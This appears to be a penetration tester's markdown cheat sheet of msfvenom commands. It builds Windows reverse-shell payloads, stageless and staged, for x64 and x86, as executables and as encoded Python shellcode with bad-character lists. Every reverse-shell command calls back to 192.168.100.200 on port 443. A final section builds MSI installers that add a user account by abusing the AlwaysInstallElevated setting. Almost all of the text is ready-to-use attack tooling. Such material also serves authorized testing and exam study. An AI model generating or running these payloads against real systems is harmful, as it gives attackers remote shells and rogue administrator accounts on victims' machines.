# Reverse
## Stageless 
### (x64)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.200 LPORT=443 -f exe -o reverse_443.exe
```

### (x86)
```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.100.200 LPORT=443 -f exe -o reverse_443.exe
```

### Shellcode x64 (Python)
```bash
msfvenom --platform windows -p windows/x64/shell_reverse_tcp -e x86/alpha_mixed -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -f python LHOST=192.168.100.200 LPORT=443
```

### Shellcode x86 (Python)
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -f python LHOST=192.168.100.200 LPORT=443
```


## Staged

### (x64)
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.100.200 LPORT=443 -f exe -o reverse_443.exe
```

### (x86)
```bash
msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=192.168.100.200 LPORT=443 -f exe -o reverse_443.exe
```

### Shellcode x64 (Python)
```bash
msfvenom --platform windows -p windows/x64/shell/reverse_tcp -e x86/alpha_mixed -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -f python LHOST=192.168.100.200 LPORT=443
```

### Shellcode x86 (Python)
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp -e x86/alpha_mixed -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -f python LHOST=192.168.100.200 LPORT=443
```

# AlwaysInstallElevated

```bash
msfvenom -p windows/adduser USER=username PASS=password -f msi-nouac -o install.msi #No uac format
```

```bash
msfvenom -p windows/adduser USER=username PASS=password -f msi -o install.msi #Using the msiexec the uac wont be prompted
```
